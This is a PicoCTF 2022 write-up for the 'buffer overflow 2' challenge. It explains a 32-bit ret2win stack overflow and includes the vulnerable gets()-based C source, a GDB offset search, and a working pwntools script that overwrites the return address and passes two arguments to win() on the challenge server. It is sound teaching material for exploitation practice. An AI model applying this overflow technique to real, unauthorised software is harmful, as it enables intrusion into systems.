---
layout: single
title:  "PicoCTF 2022 - buffer overflow 2"
categories: 
  - PicoCTF
  - Binary Exploitation
tags:
  - ctf
  - picoctf
toc: true
toc_label: "Contents"
toc_icon: "list"  # corresponding Font Awesome icon name (without fa prefix)
excerpt: "A ret2win challenge that involves parameters on the call stack."
---

## Preamble - The Call Stack
Referring to the following diagram of a call stack,
![Call Stack](https://avinetworks.com/wp-content/uploads/2020/06/buffer-overflow-diagram.png)
We note the relative locations of the base pointer, return function and parameters on our call stack. This will come in handy later.


## My Solution
As usual, we will look at the `vuln` binary. Using `checksec`, we observe the following:
```bash
$ checksec vuln                                                                     
[*] '.../vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
From this, we can crucially see that the file is a 32-bit little-endian ELF file with no stack canary. NX is enabled, but I don't think this will affect our approach for this challenge.

Now, looking at `vuln.c`, we can note down some interesting features.
```c
...
#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
As mentioned earlier, parameters are involved in this challenge. We can see that the `win()` function takes in two parameters, `arg1` and `arg2`. Within the function, we can see that the win condition is fulfilled if and only if `arg1` and `arg2` are equivalent to `0xCAFEF00D` and `0xF00DF00D`.

Aside from this, nothing else seems out of the ordinary. We'll just need to insert our parameters into the call stack when we run our exploit.

Now, let's use `readelf` to find the function addresses.
```bash
$ readelf -s vuln
>> Symbol table '.symtab' contains 77 entries:
...
64: 08049296   162 FUNC    GLOBAL DEFAULT   15 win
...
73: 08049372   122 FUNC    GLOBAL DEFAULT   15 main
...
```
For this challenge, we'll note down that the addresses of `win()` and `main()` are `0x08049296` and `0x08049372` respectively.

Let's find the offset to EIP using GDB.
```bash
$ gdb vuln
>> ...
gef➤ pattern create 150
[+] Generating a pattern of 150 bytes (n=8)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
[+] Saved as '$_gef0'
gef➤  r
Starting program: .../vuln
Please enter your string:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
...
gef➤  pattern offset $eip
[+] Searching for '64616162'/'62616164' with period=4
[+] Found at offset 112 (little-endian search) likely
```
Therefore, the offset to EIP is 112.

We can now craft our exploit. Using Python 3 and pwntools:
```python
# solve.py

from pwn import *
# elf = ELF('./vuln') # for local execution
# p = process(elf.path) # for local execution
p = remote('saturn.picoctf.net', 51325) # for remote execution

# payload buffer
payload = b'A' * 112 # offset
payload += p32(0x08049296) # win()
payload += p32(0x08049372) # main() - return function address
payload += p32(0xCAFEF00D) # param 1
payload += p32(0xF00DF00D) # param 2

p.recvline().decode("utf-8")
p.sendline(payload)
print(p.recvall())
```
```bash
[+] Opening connection to saturn.picoctf.net on port 51325: Done
picoCTF{argum3nt5_4_d4yZ_59cd5643}Please enter your string:

[*] Closed connection to saturn.picoctf.net port 51325
```


## Learning Takeaways
### How is this any different from a typical 32-bit ret2win challenge?
Recall that parameters are involved. This means that we need to craft our payload in such a manner that it can emulate a "normal" call stack.

For a standard 32-bit ret2win challenge, all we need to do is insert the address of our flag/win function into the buffer (which exists on the call stack). This was seen from our solution to the [buffer overflow 1](https://yhwong20.github.io/picoctf/binary%20exploitation/buffer-overflow-1/) challenge. This would alter the execution flow of our program, as we are now artificially inducing the execution of our flag function, by inserting it into the call stack.

What's different here, is that `win()` takes in 2 parameters. Hence, we need to add in these parameters into the call stack to trigger the win condition. If we do not insert the correct parameters, or if parameters are missing, it will cause the program to not execute correctly.

### Why does the payload look like that?
Recall the diagram of the call stack which was shown earlier, and the relative order of each region on the stack.

Firstly, for us to reach and overwrite the region of the call stack which stores parameters, we will need to go through the 4 byte space which stores the address of our return function. This means that the address of the return function must be added to the payload (after `win()`).

Normally, the return function would be `main()`, and this is also why I've chosen to preserve it in the payload (to ensure the program can run properly). However, I think it is also possible to insert any arbitrary address into the return address space (I've tried inserting `0x0` which worked just as fine). Ultimately, we just want to preserve the relative order of the stack in the payload, and this means that the return function address must be present.

Next, we'll insert our parameters. As per the **cdecl** calling conventions, which are used for x86 32-bit binaries, parameters are stored on the call stack in reverse order (generally speaking, the last argument is pushed onto the stack first, and the first argument is pushed last). This means that `arg2` is passed onto the call stack before `arg1`, and consequently, `arg2` is higher in memory than `arg1`. Since we want to emulate the call stack using our payload, we have to preserve the relative ordering of parameters as well.

Thus, we craft the payload in such a manner to ensure that `arg2` is higher in memory than `arg1`, and `win()` is as low in memory as possible (after the buffer). The earlier we insert something into the payload, the lower it should exist in memory, and this helps us maintain the relative structure and order of the call stack.


## References
- [John Hammond (YouTube): Pwntools & GDB for Buffer Overflow w/ Arguments (PicoCTF 2022 #43 'buffer-overflow2')](https://www.youtube.com/watch?v=26mEa1Ojux8&list=PL1H1sBF1VAKUbRWMCzEBi61Z_7um7V5Sd&index=44)
- [CTF 101 - Calling Conventions](https://ctf101.org/binary-exploitation/what-are-calling-conventions/)